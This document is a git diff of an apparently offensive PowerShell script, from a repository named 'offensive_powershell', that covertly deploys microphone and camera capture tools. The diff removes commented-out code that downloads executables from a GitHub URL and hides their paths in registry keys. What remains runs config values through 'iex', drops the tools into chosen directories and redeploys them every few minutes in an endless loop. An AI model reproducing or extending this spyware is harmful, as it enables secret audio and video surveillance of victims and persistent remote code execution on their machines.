@@ -17,9 +17,7 @@ function Get-Config{
 }
 
 function Get-Paths {
-    param([string]$dropPaths)
-    # $dropPaths = $raw -split "`n"
-    # $dropPaths = $dropPaths.Trim()
+    param($dropPaths)
     return $dropPaths | % { 
         $t = iex "$_"
         try{
@@ -30,51 +28,6 @@ function Get-Paths {
         } catch { } 
     } | ? { if($null -ne $_) { Test-Path -Path "$_" -PathType Container } }
 }
-
-# function Get-ToolPath {
-#     param(
-#         [string]$regKeyName,
-#         [string]$valueName
-#     )
-
-#     try{
-#         $content = (iwr -uri "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/config.txt" -UseBasicParsing).Content
-#         $keyLine = ($content -split "`n" | Where-Object { $_ -like "$RegKeyName=*" }).Trim()
-#         $valLine = ($content -split "`n" | Where-Object { $_ -like "$ValueName=*" }).Trim()
-        
-#         if(-not $keyLine -or -not $valLine) { return $null }
-
-#         $baseKey = $keyLine.Split('=')[1]
-#         $keyValue = $valLine.Split('=')[1]
-#         $baseKey = "HKCU:\$baseKey"
-
-#         if(-not(Test-Path $baseKey)){
-#             New-Item -Path $baseKey -Force | Out-Null
-#         }
-
-#         $item = Get-ItemProperty -Path $baseKey -Name $keyValue -ErrorAction SilentlyContinue
-#         if($item -and $item.$keyValue -and (Test-Path -Path $item.$keyValue -PathType Leaf)){
-#             return $item.$keyValue
-#         }
-#         return $null
-    
-#     }catch { return $null }
-# }
-
-# function Get-Tool {
-#     param(
-#         [string]$url, 
-#         [string]$name, 
-#         [string]$path
-#     )
-#     $path = Join-Path -Path $path -ChildPath "$name.exe"
-#     if(-not (Test-Path -Path $path -PathType Leaf)) {
-#         try {
-#             iwr -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
-#         } catch { " [-] Failed to download $name.exe: $($_.Message)" }
-#     }
-#     return $path
-# }
 
 function Deploy-Tool {
     param($toolConfig, $dropPaths)
@@ -106,15 +59,6 @@ $config = Get-Config
 if(-not $config) {exit}
 
 $dropPaths = Get-Paths -dropPaths $config.safe_dirs
-# $mic_path = Get-ToolPath -regKeyName "MicRegKey" -valueName "MicValueName"
-# if(-not $mic_path){
-#     $mic_path = $dropPaths | Get-Random
-# }
-# $cam_path = Get-ToolPath -regKeyName "CamRegKey" -valueName "CamValueName"
-# if(-not $cam_path){
-#     $cam_path = $dropPaths | Get-Random
-# }
-
 $mic_path = Deploy-Tool -toolConfig $config.mic -dropPaths $dropPaths
 $cam_path = Deploy-Tool -toolConfig $config.cam -dropPaths $dropPaths
 
@@ -162,16 +106,10 @@ while ($true) {
 
     if( $Counter % 12 -eq 0 -or $instant ) { # either mod with 12(3 min interval) or 20 (5 minute interval)
         if( -not( Test-Path -Path "$mic_path" -PathType Leaf ) ){
-            # $mic_path = $dropPaths | Get-Random
-            # $randomFileName = [System.IO.Path]::GetRandomFileName()
-            # $mic_path = Get-Tool -url $config.mic.url -name $randomFileName -path $mic_path
             $mic_path = Deploy-Tool -toolConfig $config.mic -dropPaths $dropPaths
             Write-Output "mic path: $mic_path"
         }
         if( -not( Test-Path -Path "$cam_path" -PathType Leaf ) ){
-            # $cam_path = $dropPaths | Get-Random
-            # $randomFileName = [System.IO.Path]::GetRandomFileName()
-            # $cam_path = Get-Tool -url $config.cam.url -name $randomFileName -path $cam_path
             $cam_path = Deploy-Tool -toolConfig $config.cam -dropPaths $dropPaths
             Write-Output "cam path: $cam_path"
         }
